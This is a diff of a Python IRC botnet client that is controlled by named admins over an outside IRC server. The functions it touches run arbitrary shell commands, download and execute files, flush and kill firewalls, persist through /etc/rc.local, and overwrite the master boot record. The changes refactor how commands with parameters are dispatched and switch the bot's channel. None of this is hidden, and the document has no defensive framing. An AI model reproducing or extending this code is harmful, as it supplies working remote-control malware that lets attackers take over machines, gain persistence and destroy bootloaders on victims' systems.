@@ -31,6 +31,7 @@ def generateNick(operatingSystem): #generates a nick for the server
 	return str(operatingSystem[:3] + rannum)
 
 def execute(cmd): #execute shell commands
+	print "in execute function. we got '%s'" % cmd
 	isItLs = 0
 	if "ls" == cmd[:2]:
 		cmd += " -pA"
@@ -102,10 +103,6 @@ def whoAmI(): #execute whoami command and send output
 
 def iAmGood(): #send back to IRC server that you are good
 	sendData("I am good. And you?")
-
-def runAndSend(cmd): #take a single command, run it, return output
-	request = execute(cmd)
-	sendData(request)
 
 def getAge(): #send uptime
 	sendData("I don't know how to do that yet boss.")
@@ -193,6 +190,8 @@ def download(cmd): #file downloader
 			
 			request = execute(download) #executing the download
 			sendData("Download executed.")
+	else:
+		sendData("I don't know how to download yet boss.")
 
 def nyanmbr(): #download nyancat.mbr and over bootloader with it
 	if (operatingSystem != "windows" and operatingSystem != ""):
@@ -237,15 +236,15 @@ def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/
 	else:
 		sendData("Either /etc/rc.local doesn't exist or I can't write to it.")
 
-
 def runFunction(cmd):
+	pos = cmd.find(" ")
 	if cmd in commands.keys(): #if regular command
 		commands[cmd]() #call appropriate function
 		print "function called"
-	elif cmd[:7] == "execute": #if they want the execute command, make that work
-		runAndSend(cmd[8:])
-	elif cmd[:8] == "download": #if they want to download a file from the internetz
-		download(cmd[9:])
+	elif cmd[:pos] in commandsParams.keys():
+		output = commandsParams[cmd[:pos]](cmd[(pos+1):]) #run appropriate function. get return value in 'output'
+		if output != None: #if the function returned something, we need to send it
+			sendData(output)
 	else: #if not recognized
 		print "command '%s' not defined" % cmd
 
@@ -265,12 +264,12 @@ INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is 
 admins = ["king", "samorizu", "blackbear", "bigshebang"]
 server = "leagueachieve.info"
 port = 6667
-channel = "#lobby"
+channel = "#test"
 nick = generateNick(operatingSystem)
 
 print "The botnick is: '%s'" % nick
 
-#dictionary of functions
+#dictionary of functions that DO NOT take parameters
 commands = {
 	"are you there" : reply,
 	"how are you" : iAmGood,
@@ -285,11 +284,17 @@ commands = {
 	"where are you" : getIP,
 	"flush firewall" : flushFirewall,
 	"firewall" : checkFirewall,
-	"download" : download,
+	"kill firewall" : killFirewall,
 	"nyanmbr" : nyanmbr,
 	"take a nap": nap,
 	"reboot" : reboot,
 	"persist" : persist
+}
+
+#dictionary of functions that DO take parameters
+commandsParams = {
+	"execute" : execute,
+	"download" : download
 }
 
 #function which parses the command and determines how to handle it
